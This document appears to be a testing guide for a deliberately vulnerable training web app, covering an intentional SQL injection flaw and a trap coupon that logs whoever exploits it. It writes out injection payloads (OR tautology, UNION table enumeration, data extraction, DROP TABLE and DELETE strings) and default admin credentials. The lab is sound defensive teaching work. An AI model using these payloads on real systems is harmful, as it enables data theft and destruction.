# Complete Testing Guide: SQL Injection Vulnerability & Trap Detection

## Overview

This guide provides step-by-step instructions to test:
1. **SQL Injection Vulnerability** - Exploiting the intentional vulnerability in `/lab/billing`
2. **Trap Detection Mechanism** - Verifying that exploitation attempts are caught and logged

---

## Prerequisites

✅ Application is running: `python app.py`
✅ LAB_MODE is enabled in `app.py`: `LAB_MODE = True`
✅ Fresh database with secret_coupons table initialized
✅ You have a registered test user account
✅ Admin account exists (username: admin, password: admin123)

---

## Part 1: Testing SQL Injection Vulnerability

### Test 1.1: Verify Lab Mode is Accessible

**Objective**: Confirm that `/lab/billing` endpoint loads when LAB_MODE is enabled

**Steps**:
1. Open browser and navigate to: `http://localhost:5000/lab/billing`
2. You should see the Lab Billing page with the form

**Expected Result**:
```
✅ Page loads successfully
✅ "Lab Billing & Coupon System" heading visible
✅ Training environment notice displayed
✅ Coupon code input form visible
```

**What to Check**:
- Lab warning banner: "This is a controlled lab environment..."
- Educational info box explaining SQL injection
- Form with "Coupon Code" input field

---

### Test 1.2: Basic SQL Injection - OR Condition

**Objective**: Execute basic SQL injection using OR condition to retrieve all coupons

**Steps**:
1. Access `/lab/billing` page
2. In the "Coupon Code" field, enter: `' OR '1'='1' --`
3. Click "Apply Coupon" button

**Expected Result**:
```
✅ Query executes without error
✅ Results returned from database
✅ Coupon found message displayed
✅ Discount percentage shown
✅ No trap alert (not the trap coupon yet)
```

**What's Happening**:
The payload `' OR '1'='1' --` breaks the query:
```sql
-- Original: SELECT * FROM secret_coupons WHERE coupon_code = '[user_input]'
-- Injected: SELECT * FROM secret_coupons WHERE coupon_code = '' OR '1'='1' --'
-- Result: Returns all coupons because '1'='1' is always true
```

**Verification in Logs**:
```bash
grep "LAB_BILLING_ATTEMPT" logs/access.log
# Should show the attempt with payload
```

---

### Test 1.3: Table Enumeration via UNION

**Objective**: Discover all database tables using UNION SELECT injection

**Steps**:
1. Access `/lab/billing` page
2. Enter payload: `' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --`
3. Click "Apply Coupon"

**Expected Result**:
```
✅ Query returns table names
✅ Shows columns from sqlite_master
✅ Coupon code should show table names like:
   - users
   - orders
   - secret_coupons (THE HIDDEN TABLE!)
   - sqlite_sequence
✅ Discount percentage shows as "2"
```

**What's Happening**:
- `UNION SELECT` combines results from two queries
- `sqlite_master` is SQLite's internal table listing all tables
- `name,2,3,4,5,6,7` fetches table name and dummy values to match columns
- Reveals the hidden `secret_coupons` table!

**Verification**:
You've discovered:
```
- There's a hidden table called: secret_coupons
- It's not referenced in the UI
- It likely contains sensitive data
```

---

### Test 1.4: Extract Secret Coupons Table

**Objective**: Retrieve coupon codes from the hidden `secret_coupons` table

**Steps**:
1. Access `/lab/billing` page
2. Enter payload: `' UNION SELECT coupon_code,discount_percentage,is_trap,0,4,5,6 FROM secret_coupons --`
3. Click "Apply Coupon"

**Expected Result**:
```
✅ Query returns coupon codes from secret_coupons
✅ Coupon Code field shows: TRAP_SQLI_EXPLOIT
✅ Discount field shows: 99
✅ You've found the trap coupon!
```

**What's Visible**:
```
Coupon Code: TRAP_SQLI_EXPLOIT
Discount: 99%
```

**What's Hidden** (in database):
```
is_trap: 1 (indicates this is a security trap)
claimed_by: NULL (not claimed yet)
claimed_at: NULL (not claimed yet)
```

---

## Part 2: Testing Trap Detection Mechanism

### Test 2.1: Trigger the Trap - Claim the Secret Coupon

**Objective**: Claim the trap coupon and trigger the exploit detection alert

**Steps**:
1. Access `/lab/billing` page
2. In the Coupon Code field, enter: `TRAP_SQLI_EXPLOIT`
3. Click "Apply Coupon"

**Expected Result**:
```
✅ Page displays warning message
✅ Warning text: "🚨 SECURITY ALERT: Trap coupon detected!"
✅ Message shown in orange/warning styling
✅ The incident has been logged
```

**User Sees**:
```
⚠️ SECURITY ALERT: Trap coupon detected! This incident has been logged.
Discount: 99%
This security trap indicates an attempt to exploit the SQL injection vulnerability.
```

**System Logs** (Behind the scenes):
- Alert type: `SQLI_EXPLOITER`
- Username: YOUR_USERNAME (the account you're logged in as)
- IP Address: 127.0.0.1 (or your actual IP)
- Timestamp: Current date/time
- Details: "User [username] claimed trap coupon: TRAP_SQLI_EXPLOIT - Likely SQL injection exploitation"

---

### Test 2.2: Verify Alert in Security Logs

**Objective**: Confirm the exploit alert was actually logged to the security log file

**Steps**:
1. Open terminal/command prompt
2. Navigate to the application directory
3. Run command: `cat logs/security_alerts.log` (or `type logs\security_alerts.log` on Windows)

**Expected Output**:
```
2025-02-07 14:32:15 - ALERT - Type: SQLI_EXPLOITER | IP: 127.0.0.1 | Details: User testuser claimed trap coupon: TRAP_SQLI_EXPLOIT - Likely SQL injection exploitation
```

**Alternative Windows Command**:
```powershell
Get-Content logs/security_alerts.log | Select-String "SQLI_EXPLOITER"
```

**Verification Checklist**:
✅ Alert type is exactly: `SQLI_EXPLOITER`
✅ Your username appears in the details
✅ Trap coupon code is recorded: `TRAP_SQLI_EXPLOIT`
✅ IP address is recorded
✅ Timestamp shows when exploit occurred

---

### Test 2.3: View Exploiter Dashboard (Admin Only)

**Objective**: Login as admin and view the detected exploiters

**Steps**:
1. Logout from current user (if logged in)
2. Navigate to: `http://localhost:5000/login`
3. Login with admin credentials:
   - Username: `admin`
   - Password: `admin123`
4. Navigate to: `http://localhost:5000/admin/exploiters`

**Expected Result**:
```
✅ Page titled: "🔍 SQL Injection Exploiters Detection"
✅ Table shows:
   - Trap Coupon Code: TRAP_SQLI_EXPLOIT
   - Claimed By: [YOUR_TEST_USERNAME]
   - Date/Time: [When you claimed it]
   - Badge: 🚨 EXPLOITER (red badge)
✅ Your test account appears as an exploiter
```

**What's Displayed**:

| Trap Coupon Code | Claimed By | Date/Time |
|---|---|---|
| TRAP_SQLI_EXPLOIT | testuser | 2025-02-07 14:32:15 |

**Database Verification** (Optional - for DBAs):
```sql
SELECT coupon_code, claimed_by, claimed_at FROM secret_coupons WHERE is_trap = 1;
```

Should return:
```
coupon_code | claimed_by | claimed_at
TRAP_SQLI_EXPLOIT | testuser | 2025-02-07 14:32:15
```

---

### Test 2.4: Verify Database Update

**Objective**: Confirm the database was updated to record the exploitation

**Steps**:
1. Open SQLite database browser or SQLite terminal
2. Run query: `SELECT * FROM secret_coupons WHERE coupon_code = 'TRAP_SQLI_EXPLOIT';`

**Expected Result**:
```
id: 1
coupon_code: TRAP_SQLI_EXPLOIT
discount_percentage: 99
is_trap: 1
claimed_by: testuser (NOW FILLED!)
claimed_at: 2025-02-07 14:32:15 (NOW FILLED!)
created_at: [earlier timestamp]
```

**Verification**:
✅ `claimed_by` field is now populated (was NULL before)
✅ `claimed_at` field has timestamp (was NULL before)
✅ Timestamp matches when trap was claimed
✅ is_trap still = 1 (indicating this is a trap)

---

## Part 3: Verify Production Routes Are Safe

### Test 3.1: Injection Attempt in Login

**Objective**: Verify that production authentication is protected against SQL injection

**Steps**:
1. Navigate to: `http://localhost:5000/login`
2. In Username field, enter: `admin' OR '1'='1' --`
3. In Password field, enter: `anything`
4. Click Login

**Expected Result**:
```
✅ Login fails
✅ Message: "Invalid username or password."
✅ No warning banner or error details given
✅ Alert logged as: INVALID_LOGIN (not vulnerable)
```

**What Did NOT Happen**:
- ❌ Did NOT log in as admin
- ❌ Did NOT execute SQL injection
- ❌ Did NOT receive database error
- ❌ Did NOT show debugging information

**Why It's Safe**:
```python
# Production login uses parameterized query:
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
# The ? placeholder prevents SQL injection
```

---

### Test 3.2: Injection Attempt in Registration

**Objective**: Verify that user registration is protected

**Steps**:
1. Navigate to: `http://localhost:5000/register`
2. In Username field, enter: `hacker'; DROP TABLE orders; --`
3. In Password field, enter: `password123`
4. Click Register

**Expected Result**:
```
✅ Registration fails
✅ Message: "Invalid username..." (input validation blocks it)
✅ Alert logged as: INVALID_REGISTRATION
✅ orders table still exists
✅ No damage possible
```

**Verification**:
- ❌ User NOT created
- ❌ No SQL injection executed
- ❌ orders table NOT dropped
- ✅ System remains secure

---

### Test 3.3: Injection Attempt in Order Placement

**Objective**: Verify order placement is protected

**Steps**:
1. Login with normal user account
2. Navigate to: `http://localhost:5000/menu`
3. Try to place order with item: `Burger'; DELETE FROM orders; --`
4. Or use browser developer tools to submit malicious form data

**Expected Result**:
```
✅ Order NOT placed
✅ Alert logged: INVALID_ORDER
✅ Message: "Invalid order. Please try again."
✅ No orders deleted
```

---

## Part 4: Complete Testing Workflow

### Step-by-Step Lab Exercise

**Total Time**: ~15 minutes

```
START
  ↓
1. Register test user account
   - Username: attacker
   - Password: password123
   ↓
2. Login as attacker
   ↓
3. Access /lab/billing endpoint
   ✅ Page loads (LAB_MODE enabled)
   ↓
4. First SQL injection attempt
   - Payload: ' OR '1'='1' --
   ✅ Get results (injection works)
   ↓
5. Enumerate tables
   - Payload: ' UNION SELECT name... FROM sqlite_master
   ✅ Discover hidden secret_coupons table
   ↓
6. Extract secret data
   - Payload: ' UNION... FROM secret_coupons
   ✅ Find TRAP_SQLI_EXPLOIT coupon
   ↓
7. Claim trap coupon
   - Input: TRAP_SQLI_EXPLOIT
   ✅ Get warning: "SECURITY ALERT: Trap coupon detected!"
   ↓
8. Verify alert logged
   - Check: logs/security_alerts.log
   ✅ See SQLI_EXPLOITER alert with attacker username
   ↓
9. Login as admin
   - Username: admin
   - Password: admin123
   ↓
10. View exploiters dashboard
   - Navigate: /admin/exploiters
   ✅ See attacker in detected exploiters list
   ↓
11. Verify production routes safe
   - Try inject in login ✅ Protected
   - Try inject in register ✅ Protected
   - Try inject in orders ✅ Protected
   ↓
END
```

---

## Testing Checklist

Mark these off as you complete each test:

### Vulnerability Tests
- [ ] Lab endpoint accessible when LAB_MODE=True
- [ ] Basic SQL injection works (' OR '1'='1')
- [ ] Table enumeration works (sqlite_master)
- [ ] Hidden table discovered (secret_coupons)
- [ ] Secret coupon extracted
- [ ] Different injection vectors work

### Trap Detection Tests
- [ ] Trap coupon triggers warning message
- [ ] Alert logged as SQLI_EXPLOITER
- [ ] Username recorded in alert
- [ ] IP address recorded in alert
- [ ] Timestamp recorded correctly
- [ ] Database updated (claimed_by, claimed_at)
- [ ] Admin can view exploiter

### Production Safety Tests
- [ ] Login protected (injection blocked)
- [ ] Registration protected (injection blocked)
- [ ] Order placement protected (injection blocked)
- [ ] All other routes use parameterized queries
- [ ] No production data accessible via lab

### Documentation Tests
- [ ] All log files exist and are readable
- [ ] Timestamps are accurate
- [ ] Alert messages are clear
- [ ] Admin dashboard user-friendly

---

## Common Issues & Solutions

### Issue: Lab endpoint returns 403 Forbidden
**Solution**: 
```python
# Check in app.py:
LAB_MODE = True  # Ensure it's True, not False
# Then restart: python app.py
```

### Issue: Secret table not found
**Solution**:
```bash
# Delete old database to create fresh one with new table
rm restaurant.db
# Restart application - new DB will be created
python app.py
```

### Issue: Trap alert not showing
**Solution**:
```bash
# Verify database has the trap coupon:
sqlite3 restaurant.db
SELECT * FROM secret_coupons WHERE coupon_code='TRAP_SQLI_EXPLOIT';
# If empty, check init_db() code
```

### Issue: Admin exploiters page empty
**Solution**:
```bash
# Verify you actually claimed the trap:
grep TRAP_SQLI_EXPLOIT logs/security_alerts.log
# Verify claimed_by is filled:
sqlite3 restaurant.db
SELECT claimed_by FROM secret_coupons WHERE is_trap=1;
```

---

## Success Criteria

You've successfully tested both components if:

✅ **Vulnerability Working**:
- SQL injection executes on /lab/billing
- Table enumeration reveals hidden tables
- Trap coupon can be discovered

✅ **Trap Detection Working**:
- Claiming trap shows warning message
- Alert logged as SQLI_EXPLOITER
- Database records the claim
- Admin dashboard shows exploiter

✅ **Production Safe**:
- Other routes reject injection attempts
- Normal users unaffected
- All queries use parameterized patterns

✅ **Logging Perfect**:
- All attempts logged with timestamp
- IP address recorded
- Username captured
- Clear audit trail exists

---

## Next Steps

After testing, consider:

1. **Disable Lab Mode** (Production)
   ```python
   LAB_MODE = False  # Back to safe mode
   ```

2. **Review Logs**
   - Analyze exploitation patterns
   - Train users on secure coding
   - Show detection capabilities

3. **Clean Up** (Optional)
   ```bash
   rm logs/security_alerts.log
   rm logs/access.log
   rm restaurant.db
   ```

4. **Document Findings**
   - Screenshot successful exploitation
   - Screenshot alert logs
   - Screenshot admin dashboard
   - Include in training materials
